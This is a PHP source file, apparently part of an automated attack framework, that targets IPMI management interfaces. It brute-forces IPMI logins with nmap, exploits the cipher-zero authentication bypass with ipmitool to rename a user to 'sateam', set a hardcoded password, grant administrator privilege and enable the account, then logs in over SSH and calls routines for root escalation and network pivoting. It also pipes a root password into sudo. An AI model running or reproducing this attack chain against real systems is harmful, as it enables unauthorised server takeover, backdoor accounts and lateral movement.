<?php


class service2ipmi extends service2ftp {


    public function __construct($eth,$domain,$ip,$port,$service_protocol) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol);
    }


public function service2ipmi4exec(){
    $result = "";
        
        $result .= $this->service2ipmi2chiper_zero();
        
        $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ipmi-cipher-zero\" $this->ip -s$this->protocol -p $this->port -e $this->eth  | grep   \"State: VULNERABLE\" ";
        $result .= $this->req_ret_str($query);

        
        $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ipmi-version\" $this->ip -s$this->protocol -p $this->port -e $this->eth  -oX -";
        $result .= $this->req_ret_str($query);
        
        

        
        $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ipmi-brute.nse\" --script-args userdb=$this->dico_users,passdb=$this->dico_users $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
        $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);


        
        return $result;
  }
  
  public function service2ipmi2chiper_zero2user($user){
      $result = "";
      $result .= $this->ssTitre(__FUNCTION__);
      $user2name_created = "sateam";
      $user2name_pass = "sateam123456789";
      $user = trim($user);
      $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user summary 2> /dev/null | grep 'Enabled User Count  :' | cut -d':' -f2 ";
      $user_id = trim($this->req_ret_str($query));
      
      if(!empty($user_id)) {
          $result .= $this->yesUSERS($this->port2id, $user, __FUNCTION__, "USER ID: $user_id");
          $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user list | grep -v 'NO ACCESS'  | grep -v 'Link Auth' |  awk '{print $2}' ";
          $users_list = $this->req_ret_str($query);
          $result .= $users_list  ;
          $users_list_tab = explode("\n", $users_list);
          foreach ($users_list_tab as $user_rec) if(!empty($user_rec)) $result .= $this->yesUSERS($this->port2id, $user_rec, __FUNCTION__, "User List:$user");
          $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user set name $user_id $user2name_created   ";
          $result .= $this->req_ret_str($query);
          $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user set password $user_id $user2name_pass   ";
          $result .= $this->req_ret_str($query);
          $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user priv $user_id 4   ";
          $result .= $this->req_ret_str($query);
          $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user enable $user_id   ";
          $result .= $this->req_ret_str($query);
          $query = "ipmitool -I lanplus -C 0 -U $user -P hacked -H $this->ip user list ";
          $result .= trim($this->req_ret_str($query));
          $this->pause();
          

              $ssh_ports_open = $this->ip2ports4service("ssh");
              foreach ($ssh_ports_open as $ssh_port_open){
              $result .= $this->article("SSH PORT FOUND", $ssh_port_open);
              // $find_user
              $stream = $this->stream8ssh8passwd($this->ip, $ssh_port_open, $user2name_created,$user2name_pass);
              if ( is_resource($stream)){
                  $result .= $this->yesAUTH($this->port2id, $user2name_created, $user2name_pass, "", "", "", "", "", __FUNCTION__." create SSH user $user via IPMI ", $this->ip2geoip());
                  $obj_lan = new lan4linux($this->port2id, $stream,__FUNCTION__." IPMI2SSH4user:$user:$user2name_created/$user2name_pass");
                  $result .=  $obj_lan->lan4root();
                  $result .=  $obj_lan->lan2pivot($user2name_created, $user2name_pass);
              }
              
          }
          $this->pause();
          
      }
      return $result;
  }
  
  
  public function service2ipmi2chiper_zero(){
      $result = "";
      $result .= $this->ssTitre(__FUNCTION__);

      $sql_r = "select distinct(user2name) FROM USERS WHERE id8port = '$this->port2id' ORDER BY user2name;";
      $conn = $this->mysql_ressource->query($sql_r);
      while ($row = $conn->fetch_assoc()){
          $user2name = trim($row['user2name']);
          $this->article("USER FOUND FOR TEST", "$user2name");
          if(!empty($user2name)) {
              sleep(1); // on doit laisser sleep 1        
          $result .= $this->service2ipmi2chiper_zero2user($user2name);
          }
      }
      
      
      $dico = "$this->dico_users";
      //$dico = "$this->dir_tmp/ipmi_users.txt";
      $users_dico = file($dico);
      foreach ($users_dico as $user ){
          if(!empty($user)) {
              sleep(1); // on doit laisser sleep 1 
            $result .= $this->service2ipmi2chiper_zero2user($user);
          }
      }
      
      
      
      
      return $result ;
  }
  
  
  
  
  
  
  
  
}

?>
